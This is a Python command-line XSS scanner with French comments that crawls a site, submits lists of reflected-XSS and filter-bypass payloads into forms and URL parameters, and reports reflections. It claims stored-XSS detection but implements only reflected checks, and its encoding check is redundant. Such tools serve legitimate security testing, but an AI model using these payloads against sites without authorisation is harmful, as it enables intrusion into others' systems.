#!/usr/bin/env python3
"""
XSS Vulnerability Scanner
Détection automatique de vulnérabilités XSS (Reflected & Stored)
Usage: python3 xss_scanner.py <url> [options]
"""

import requests
import argparse
import sys
from urllib.parse import urljoin, urlparse, parse_qs
from bs4 import BeautifulSoup
import re
import time

class Colors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    MAGENTA = '\033[95m'
    END = '\033[0m'
    BOLD = '\033[1m'

# Payloads XSS communs
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "<iframe src=javascript:alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<select onfocus=alert('XSS') autofocus>",
    "<textarea onfocus=alert('XSS') autofocus>",
    "<marquee onstart=alert('XSS')>",
    "<div onmouseover=alert('XSS')>",
    "javascript:alert('XSS')",
    "\"><script>alert('XSS')</script>",
    "'><script>alert('XSS')</script>",
    "<ScRiPt>alert('XSS')</ScRiPt>",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<img src='x' onerror='alert(1)'>",
    "<<SCRIPT>alert('XSS');//<</SCRIPT>",
    "<script>alert`XSS`</script>",
]

# Payloads pour contournement de filtres
BYPASS_PAYLOADS = [
    "<sCrIpT>alert('XSS')</sCrIpT>",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<IMG SRC=j&#X41;vascript:alert('XSS')>",
    "<IMG SRC=javascript:alert('XSS')>",
    "<IMG SRC=JaVaScRiPt:alert('XSS')>",
    "<IMG SRC=`javascript:alert('XSS')`>",
    "<IMG \"\"\"><SCRIPT>alert('XSS')</SCRIPT>\">",
    "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
]

class XSSScanner:
    def __init__(self, url, payloads=None, verify_ssl=True, timeout=10):
        self.base_url = url
        self.payloads = payloads or XSS_PAYLOADS
        self.verify_ssl = verify_ssl
        self.timeout = timeout
        self.vulnerabilities = []
        self.tested_urls = set()
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        })
    
    def banner(self):
        print(f"{Colors.MAGENTA}{Colors.BOLD}")
        print("╔════════════════════════════════════════╗")
        print("║       XSS Vulnerability Scanner        ║")
        print("║    Reflected & Stored XSS Detection    ║")
        print("╚════════════════════════════════════════╝")
        print(f"{Colors.END}")
    
    def get_forms(self, url):
        """Récupère tous les formulaires d'une page"""
        try:
            response = self.session.get(url, verify=self.verify_ssl, timeout=self.timeout)
            soup = BeautifulSoup(response.text, 'html.parser')
            return soup.find_all('form')
        except Exception as e:
            print(f"{Colors.RED}[!] Erreur lors de la récupération des formulaires: {e}{Colors.END}")
            return []
    
    def get_form_details(self, form):
        """Extrait les détails d'un formulaire"""
        details = {}
        action = form.attrs.get('action', '').lower()
        method = form.attrs.get('method', 'get').lower()
        inputs = []
        
        for input_tag in form.find_all('input'):
            input_type = input_tag.attrs.get('type', 'text')
            input_name = input_tag.attrs.get('name')
            input_value = input_tag.attrs.get('value', '')
            inputs.append({
                'type': input_type,
                'name': input_name,
                'value': input_value
            })
        
        for textarea_tag in form.find_all('textarea'):
            textarea_name = textarea_tag.attrs.get('name')
            inputs.append({
                'type': 'textarea',
                'name': textarea_name,
                'value': ''
            })
        
        for select_tag in form.find_all('select'):
            select_name = select_tag.attrs.get('name')
            inputs.append({
                'type': 'select',
                'name': select_name,
                'value': ''
            })
        
        details['action'] = action
        details['method'] = method
        details['inputs'] = inputs
        
        return details
    
    def submit_form(self, form_details, url, payload):
        """Soumet un formulaire avec un payload"""
        target_url = urljoin(url, form_details['action'])
        inputs = form_details['inputs']
        data = {}
        
        for input_field in inputs:
            if input_field['type'] == 'text' or input_field['type'] == 'search':
                data[input_field['name']] = payload
            elif input_field['type'] == 'email':
                data[input_field['name']] = f"test{payload}@example.com"
            elif input_field['type'] == 'textarea':
                data[input_field['name']] = payload
            elif input_field['value'] or input_field['type'] == 'hidden':
                data[input_field['name']] = input_field['value']
            else:
                data[input_field['name']] = payload
        
        try:
            if form_details['method'] == 'post':
                response = self.session.post(target_url, data=data, verify=self.verify_ssl, timeout=self.timeout)
            else:
                response = self.session.get(target_url, params=data, verify=self.verify_ssl, timeout=self.timeout)
            
            return response
        except Exception as e:
            print(f"{Colors.RED}[!] Erreur lors de la soumission du formulaire: {e}{Colors.END}")
            return None
    
    def check_xss_in_response(self, response, payload):
        """Vérifie si le payload est présent dans la réponse"""
        if not response:
            return False
        
        # Vérification simple: le payload est-il dans la réponse?
        if payload in response.text:
            return True
        
        # Vérification des variantes encodées
        html_encoded = payload.replace('<', '&lt;').replace('>', '&gt;')
        if html_encoded not in response.text and payload in response.text:
            return True
        
        return False
    
    def test_reflected_xss_form(self, url):
        """Test XSS reflété sur les formulaires"""
        print(f"\n{Colors.YELLOW}[*] Test des formulaires sur: {url}{Colors.END}")
        
        forms = self.get_forms(url)
        if not forms:
            print(f"{Colors.BLUE}[*] Aucun formulaire trouvé{Colors.END}")
            return
        
        print(f"{Colors.BLUE}[*] {len(forms)} formulaire(s) trouvé(s){Colors.END}")
        
        for i, form in enumerate(forms):
            form_details = self.get_form_details(form)
            print(f"\n{Colors.CYAN}[*] Test du formulaire #{i+1} ({form_details['method'].upper()}){Colors.END}")
            
            for payload in self.payloads:
                response = self.submit_form(form_details, url, payload)
                
                if self.check_xss_in_response(response, payload):
                    vuln = {
                        'type': 'Reflected XSS',
                        'url': url,
                        'method': form_details['method'],
                        'payload': payload,
                        'form': form_details
                    }
                    self.vulnerabilities.append(vuln)
                    
                    print(f"{Colors.RED}{Colors.BOLD}[VULN!] XSS Reflected détecté!{Colors.END}")
                    print(f"{Colors.RED}  Payload: {payload}{Colors.END}")
                    print(f"{Colors.RED}  Méthode: {form_details['method'].upper()}{Colors.END}")
                    
                    # Pas besoin de tester tous les payloads si un fonctionne
                    break
                
                time.sleep(0.1)  # Petit délai pour éviter de surcharger le serveur
    
    def test_reflected_xss_url(self, url):
        """Test XSS reflété sur les paramètres URL"""
        print(f"\n{Colors.YELLOW}[*] Test des paramètres URL: {url}{Colors.END}")
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            print(f"{Colors.BLUE}[*] Aucun paramètre URL trouvé{Colors.END}")
            return
        
        print(f"{Colors.BLUE}[*] {len(params)} paramètre(s) trouvé(s): {list(params.keys())}{Colors.END}")
        
        for param in params:
            for payload in self.payloads:
                test_params = params.copy()
                test_params[param] = [payload]
                
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                
                try:
                    response = self.session.get(test_url, params=test_params, verify=self.verify_ssl, timeout=self.timeout)
                    
                    if self.check_xss_in_response(response, payload):
                        vuln = {
                            'type': 'Reflected XSS',
                            'url': url,
                            'parameter': param,
                            'payload': payload,
                            'method': 'GET'
                        }
                        self.vulnerabilities.append(vuln)
                        
                        print(f"{Colors.RED}{Colors.BOLD}[VULN!] XSS Reflected détecté!{Colors.END}")
                        print(f"{Colors.RED}  Paramètre: {param}{Colors.END}")
                        print(f"{Colors.RED}  Payload: {payload}{Colors.END}")
                        
                        break
                    
                    time.sleep(0.1)
                except Exception as e:
                    print(f"{Colors.RED}[!] Erreur: {e}{Colors.END}")
    
    def crawl_links(self, url, depth=2):
        """Crawl les liens d'une page"""
        if depth == 0 or url in self.tested_urls:
            return []
        
        self.tested_urls.add(url)
        links = []
        
        try:
            response = self.session.get(url, verify=self.verify_ssl, timeout=self.timeout)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            for link in soup.find_all('a', href=True):
                href = link['href']
                full_url = urljoin(url, href)
                
                # Garder seulement les liens du même domaine
                if urlparse(full_url).netloc == urlparse(url).netloc:
                    if full_url not in self.tested_urls:
                        links.append(full_url)
        except Exception as e:
            print(f"{Colors.RED}[!] Erreur crawl: {e}{Colors.END}")
        
        return links[:10]  # Limiter à 10 liens par page
    
    def generate_report(self):
        """Génère un rapport des vulnérabilités"""
        print(f"\n{Colors.BOLD}{Colors.CYAN}{'='*60}{Colors.END}")
        print(f"{Colors.BOLD}RAPPORT DE SCAN XSS{Colors.END}")
        print(f"{Colors.CYAN}{'='*60}{Colors.END}\n")
        
        if not self.vulnerabilities:
            print(f"{Colors.GREEN}[✓] Aucune vulnérabilité XSS détectée{Colors.END}")
            return
        
        print(f"{Colors.RED}{Colors.BOLD}[!] {len(self.vulnerabilities)} vulnérabilité(s) détectée(s):{Colors.END}\n")
        
        for i, vuln in enumerate(self.vulnerabilities, 1):
            print(f"{Colors.BOLD}Vulnérabilité #{i}:{Colors.END}")
            print(f"  Type:     {vuln['type']}")
            print(f"  URL:      {vuln['url']}")
            print(f"  Méthode:  {vuln['method']}")
            print(f"  Payload:  {vuln['payload']}")
            if 'parameter' in vuln:
                print(f"  Paramètre: {vuln['parameter']}")
            print()
    
    def scan(self, crawl=False):
        """Lance le scan"""
        self.banner()
        
        print(f"{Colors.BLUE}[*] Cible: {self.base_url}{Colors.END}")
        print(f"{Colors.BLUE}[*] Payloads: {len(self.payloads)}{Colors.END}")
        print(f"{Colors.BLUE}[*] Timeout: {self.timeout}s{Colors.END}\n")
        
        urls_to_test = [self.base_url]
        
        if crawl:
            print(f"{Colors.YELLOW}[*] Crawling des liens...{Colors.END}")
            additional_urls = self.crawl_links(self.base_url)
            urls_to_test.extend(additional_urls)
            print(f"{Colors.BLUE}[*] {len(urls_to_test)} URL(s) à tester{Colors.END}")
        
        try:
            for url in urls_to_test:
                # Test formulaires
                self.test_reflected_xss_form(url)
                
                # Test paramètres URL
                self.test_reflected_xss_url(url)
            
            # Rapport final
            self.generate_report()
        
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[*] Scan interrompu{Colors.END}")
            self.generate_report()

def main():
    parser = argparse.ArgumentParser(
        description="XSS Vulnerability Scanner - Détection de vulnérabilités XSS"
    )
    parser.add_argument("url", help="URL cible (ex: http://example.com)")
    parser.add_argument("-c", "--crawl", action="store_true",
                       help="Crawler les liens et tester toutes les pages")
    parser.add_argument("-p", "--payloads", help="Fichier de payloads personnalisés (un par ligne)")
    parser.add_argument("--timeout", type=int, default=10,
                       help="Timeout des requêtes en secondes (défaut: 10)")
    parser.add_argument("--no-verify-ssl", action="store_true",
                       help="Désactiver la vérification SSL")
    parser.add_argument("--bypass", action="store_true",
                       help="Utiliser les payloads de contournement")
    
    args = parser.parse_args()
    
    # Charger les payloads
    payloads = XSS_PAYLOADS
    if args.bypass:
        payloads = BYPASS_PAYLOADS
    
    if args.payloads:
        try:
            with open(args.payloads, 'r') as f:
                payloads = [line.strip() for line in f if line.strip()]
            print(f"{Colors.GREEN}[+] {len(payloads)} payloads chargés depuis {args.payloads}{Colors.END}")
        except FileNotFoundError:
            print(f"{Colors.RED}[!] Fichier de payloads introuvable: {args.payloads}{Colors.END}")
            sys.exit(1)
    
    # Désactiver les warnings SSL si nécessaire
    if args.no_verify_ssl:
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    scanner = XSSScanner(
        url=args.url,
        payloads=payloads,
        verify_ssl=not args.no_verify_ssl,
        timeout=args.timeout
    )
    
    scanner.scan(crawl=args.crawl)

if __name__ == "__main__":
    main()